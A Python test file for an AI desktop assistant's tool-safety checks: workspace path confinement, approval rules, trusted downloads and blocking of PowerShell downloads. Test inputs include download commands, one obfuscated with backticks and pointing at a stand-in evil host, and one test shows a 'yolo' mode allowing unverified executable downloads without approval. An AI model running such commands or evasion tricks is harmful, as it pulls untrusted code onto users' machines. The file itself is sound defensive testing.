from __future__ import annotations

from pathlib import Path

from friday.safety import (
    RiskLevel,
    classify_tool,
    evaluate_tool,
    path_in_workspace,
)
from friday.storage import UserSettings


def test_classify_tool_risk_levels():
    assert classify_tool("read_text_file") == RiskLevel.READ
    assert classify_tool("write_text_file") == RiskLevel.WRITE
    assert classify_tool("run_powershell") == RiskLevel.EXEC
    assert classify_tool("clipboard_write") == RiskLevel.WRITE


def test_path_in_workspace_inside(workspace: Path):
    root = str(workspace.resolve()).replace("\\", "/")
    inside = str((workspace / "inside.txt").resolve()).replace("\\", "/")
    assert path_in_workspace(inside, root) is True


def test_path_in_workspace_outside(workspace: Path):
    root = str(workspace.resolve()).replace("\\", "/")
    assert path_in_workspace("C:/Windows/System32", root) is False


def test_path_in_workspace_dotdot(workspace: Path):
    root = str(workspace.resolve()).replace("\\", "/")
    escape = str((workspace / ".." / "outside.txt").resolve()).replace("\\", "/")
    assert path_in_workspace(escape, root) is False


def test_evaluate_read_blocked_outside_workspace(workspace: Path):
    settings = UserSettings(
        workspace=str(workspace).replace("\\", "/"),
        restrict_to_workspace=True,
        allow_read_user_folders=False,
    )
    decision = evaluate_tool(settings, "read_text_file", {"path": "C:/Windows/notepad.exe"})
    assert decision.allowed is False
    assert "超出" in decision.reason


def test_evaluate_read_allowed_known_user_folder(workspace: Path, monkeypatch):
    desktop = workspace.parent / "Desktop"
    desktop.mkdir()
    note = desktop / "note.txt"
    note.write_text("x", encoding="utf-8")
    monkeypatch.setattr(
        "friday.safety.known_folders",
        lambda default_workspace_path="": {"桌面": str(desktop.resolve()).replace("\\", "/")},
    )
    settings = UserSettings(
        workspace=str(workspace).replace("\\", "/"),
        restrict_to_workspace=True,
        allow_read_user_folders=True,
    )
    decision = evaluate_tool(
        settings,
        "read_text_file",
        {"path": str(note.resolve()).replace("\\", "/")},
    )
    assert decision.allowed is True


def test_evaluate_read_allowed_inside_workspace(workspace: Path):
    settings = UserSettings(
        workspace=str(workspace).replace("\\", "/"),
        restrict_to_workspace=True,
    )
    inside = str((workspace / "inside.txt").resolve()).replace("\\", "/")
    decision = evaluate_tool(settings, "read_text_file", {"path": inside})
    assert decision.allowed is True
    assert decision.needs_approval is False


def test_evaluate_clipboard_write_needs_approval():
    settings = UserSettings(require_approval_writes=True)
    decision = evaluate_tool(settings, "clipboard_write", {"text": "secret"})
    assert decision.allowed is True
    assert decision.needs_approval is True


def test_powershell_download_blocked():
    settings = UserSettings(allow_powershell=True)
    decision = evaluate_tool(
        settings,
        "run_powershell",
        {"command": "Invoke-WebRequest -Uri https://example.com/a.exe -OutFile E:/a.exe"},
    )
    assert decision.allowed is False
    assert "download_software" in decision.reason or "download_file" in decision.reason


def test_powershell_http_probe_blocked():
    settings = UserSettings(allow_powershell=True)
    decision = evaluate_tool(
        settings,
        "run_powershell",
        {"command": '$page = Invoke-WebRequest -Uri "https://www.kugou.com/download/" -UseBasicParsing'},
    )
    assert decision.allowed is False


def test_evaluate_write_disabled_by_setting():
    settings = UserSettings(allow_write_files=False)
    decision = evaluate_tool(settings, "write_text_file", {"path": "a.txt", "content": "x"})
    assert decision.allowed is False
    assert "禁用" in decision.reason


def test_download_file_allowed_outside_workspace(workspace: Path):
    settings = UserSettings(
        workspace=str(workspace).replace("\\", "/"),
        restrict_to_workspace=True,
        require_approval_writes=False,
    )
    decision = evaluate_tool(
        settings,
        "download_file",
        {"url": "https://d1.music.126.net/dmusic/setup.exe", "destination": "E:/NeteaseCloudMusic_Setup.exe"},
    )
    assert decision.allowed is True


def test_should_request_approval_once_per_turn():
    from friday.safety import TurnApprovalState, ToolDecision, mark_turn_approved, should_request_approval

    settings = UserSettings(approve_once_per_turn=True, require_approval_exec=True)
    state = TurnApprovalState()
    decision = ToolDecision(True, True)

    assert should_request_approval(settings, decision, state) is True
    mark_turn_approved(state, decision)
    assert should_request_approval(settings, decision, state) is False


def test_always_require_respects_once_per_turn_after_general():
    from friday.safety import TurnApprovalState, ToolDecision, mark_turn_approved, should_request_approval

    settings = UserSettings(approve_once_per_turn=True, require_approval_exec=True)
    state = TurnApprovalState()
    destructive = ToolDecision(
        True,
        True,
        always_require_approval=True,
        reuse_turn_approval=True,
    )

    assert should_request_approval(settings, destructive, state) is True
    mark_turn_approved(state, destructive)
    assert should_request_approval(settings, destructive, state) is False


def test_always_require_image_gen_never_reuses_turn():
    from friday.safety import TurnApprovalState, ToolDecision, should_request_approval

    settings = UserSettings(approve_once_per_turn=True, require_approval_writes=True)
    state = TurnApprovalState(general=True)
    image = ToolDecision(True, True, always_require_approval=True)
    assert should_request_approval(settings, image, state) is True


def test_yolo_unlocked_skips_untrusted_download_confirm(monkeypatch):
    from friday.tools.web_limits import DownloadProbe
    from friday.tools.web_trust import TrustLevel, TrustReport

    def _probe(url: str, *, use_cache: bool = True) -> DownloadProbe:
        return DownloadProbe(url=url, final_url=url, content_length=1024)

    def _trust(url, *, expected_software="", use_cache=True):
        return TrustReport(
            url=url,
            domain="mirror.example",
            level=TrustLevel.UNVERIFIED,
            label="未验证镜像",
            reasons=["非官方域名"],
        )

    monkeypatch.setattr("friday.tools.web.probe_download", _probe)
    monkeypatch.setattr("friday.tools.web_trust.assess_download_trust", _trust)

    settings = UserSettings(
        require_trusted_downloads=True,
        require_approval_writes=True,
        interaction_mode="yolo",
    )
    args = {"url": "https://mirror.example/app.exe", "destination": "app.exe"}

    locked = evaluate_tool(settings, "download_file", args, yolo_unlocked=False)
    assert locked.allowed is False

    unlocked = evaluate_tool(settings, "download_file", args, yolo_unlocked=True)
    assert unlocked.allowed is True
    assert unlocked.needs_approval is False


def test_powershell_backtick_download_blocked_at_evaluate():
    settings = UserSettings(allow_powershell=True)
    decision = evaluate_tool(
        settings,
        "run_powershell",
        {"command": "I`WR https://evil.example/x -OutFile E:/x.exe"},
    )
    assert decision.allowed is False


def test_large_download_still_needs_separate_approval():
    from friday.safety import TurnApprovalState, ToolDecision, mark_turn_approved, should_request_approval

    settings = UserSettings(approve_once_per_turn=True, require_approval_writes=True)
    state = TurnApprovalState()
    normal = ToolDecision(True, True)
    mark_turn_approved(state, normal)

    large = ToolDecision(True, True, large_download=True)
    assert should_request_approval(settings, large, state) is True
